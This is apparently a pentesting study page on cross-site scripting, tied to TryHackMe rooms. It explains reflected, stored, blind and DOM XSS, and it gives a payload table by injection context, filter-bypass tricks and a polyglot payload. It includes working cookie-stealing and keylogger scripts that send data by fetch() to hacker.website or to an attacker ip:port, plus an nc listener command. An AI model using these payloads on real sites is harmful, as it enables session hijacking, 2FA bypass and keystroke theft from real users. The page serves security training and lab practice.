# XSS vulnerabilities (Javascript)

[![xssgi](../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xssgi](../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)

<div class="row row-cols-md-2"><div>

Cross-site Scripting, most commonly called **XSS**, refer to injecting malicious JavaScript in a web application with the goal of it being executed by other users.

**The usual proof of concept**: show an alert if the script was executed.

```js
<script>alert('XSS')</script>
```

I think you would enjoy more

```js
<script>console.log('XSS')</script>
```

You will most likely use these references:

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) (42.5k ‚≠ê)
* [OWASP Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) (22k ‚≠ê)
* [OWASP DOM XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) (22k ‚≠ê)

<br>

One thing to remember is that you would rather make it invisible to the user that a script is being executed in its browser. As such, if you inject a malicious payload in the source attribute of an image field, it would be best to still make sure an image is properly displayed, so that it does not look suspicious at first glance.

</div><div>

<p class="text-center">Some attacks</p>

**Session hijacking**: anyone executing this script will send their cookie to a malicious website owned by the hacker used to capture cookies. The script is using `btoa()` to encode in base64 the values. Sessions cookies are gold üí∞, because with them, we can simulate that we are logged, and bypass verifications such as 2FA.

```html
<script>fetch('https://hacker.website/hijack?cookie=' + btoa(document.cookie));</script>
<!--
CTF: nc -nlvp port | And use the ip:port
Decode: sed -n 's/GET \/?cookie=\(.*\)/\1/p' request | base64 -d
-->
<script>fetch('http://ip:port/?cookie=' + btoa(document.cookie));</script>
```

**A keylogger**: send keys pressed to the hacker website. The script is using `btoa()` to encode in base64 the values.

<details class="details-n">
<summary>See code</summary>

```html
<script>
    let keys = ''
    document.onkeydown = e => keys += e.key
    setInterval(() => {
        if (keys === '') return
        fetch('https://hacker.website/keylogger?key=' + btoa(keys) )
        keys = ''
    }, 1000)
</script>
```
</details>

* Exploit the client privileges to query the website API if any
* Map open ports on the target
* ...

> See [XSS-payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all) for more exploits, but it's a bit old.
</div></div>

<hr class="sl">

## Reflected XSS

<div class="row row-cols-md-2"><div>

The malicious code is usually inside a URL, and the vulnerable website when loading the URL, will execute the malicious website.
</div><div>

For instance, "https://vulnerable.search.engine" is a search engine in which the query is stored in the URL in the parameter `q`. The website is vulnerable to XSS, so if we open the URL, then the javascript will run in our browser.

```
https://vulnerable.search.engine/?q=%3Cscript%3Ealert(%27XSS%27)%3B%3C%2Fscript%3E
```
</div></div>

<hr class="sr">

## Stored XSS

<div class="row row-cols-md-2"><div>

The malicious code is stored by the website, usually in a database. Then, in another page loading the data from the database, a vulnerable website will execute the malicious code.

> Comments, profiles, listings... may be vulnerable.
</div><div>

For instance, a user using the value `<script>alert('XSS');</script>` as username. Then, for instance on the vulnerable profile page, any user opening a link to the compromised profile, will execute the malicious code.
</div></div>

<hr class="sl">

## DOM Based XSS

...

<hr class="sr">

## Blind XSS

<div class="row row-cols-md-2"><div>

In blind XSS, you are usually sending a payload in a contact/support... forms, in order to maybe steal information from the admin-side website if any. We are calling it "blind XSS", because it's not possible to see if it's working.
</div><div>

See [xsshunter](https://github.com/mandatoryprogrammer/xsshunter) (1.2k ‚≠ê)
</div></div>

<hr class="sl">

## XSS payloads

<table class="table table-bordered table-striped border-dark mt-4">
<thead>
<tr><th>Case</th><th>HTML</th><th>Payload</th></tr>
</thead>
<tbody>

<tr><td>Boxed attribute</td><td><code>&lt;input value="here"&gt;</code></td><td><code>">MaliciousCodeHere</code></td></tr>

<tr><td>Unboxed attribute</td><td><code>&lt;input value=here&gt;</code></td><td><code>>MaliciousCodeHere</code></td></tr>

<tr><td>Wrapped</td><td><code>&lt;textarea>here&lt;/textarea&gt;</code></td><td><code>&lt;/textarea&gt;MaliciousCodeHere</code></td></tr>

<tr><td>JavaScript</td><td><code>xxx.innerHTML = 'here';</code></td><td><code>';MaliciousCodeHere;//</code></td></tr>

<tr><td>Boxed Image</td><td><code>&lt;img src="here" alt="xxx"/&gt;</code></td><td><code>URL" onload="maliciousCodeHere"</code></td></tr>

<tr><td>Boxed Image</td><td><code>&lt;img src="here" alt="xxx"/&gt;</code></td><td><code>URL" onerror="maliciousCodeHere"</code></td></tr>

</tbody></table>

<hr class="sr">

## Bypass filters

<div class="row row-cols-md-2"><div>

**Logic flaw**

Developers may not protect everything. For instance a select list in which a user is supposed to pick a country. A hacker can try to inject a malicious payload instead of a country, and as the developer used a select list, it may not be filtered.

**Bypass HTML symbols filtering**

If `<`, and `>` are filtered, an attacker may still use HTML attributes.
</div><div>

**Replace failures**

If a developer used a "replace" function, then they there are tricks such as the one below. If there is a filter removing "script", then after removal of "&lt;script&gt;", we will have "s" concatenated with "cript", and we successfully bypassed the filter.

```
<s<script>cript>alert('XSS');</s<script>cript>
// filter remove "<script>"
<script>alert('XSS');</script>
```

There are also various tricks using ASCII/... to bypass filters.
</div></div>

<hr class="sl">

## Polyglots - the magic payloads

<div class="row row-cols-md-2"><div>

XSS polyglots are sort of magic payloads designed to bypass many tags/attributes/filters/... at once.
</div><div>

An example

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```
</div></div>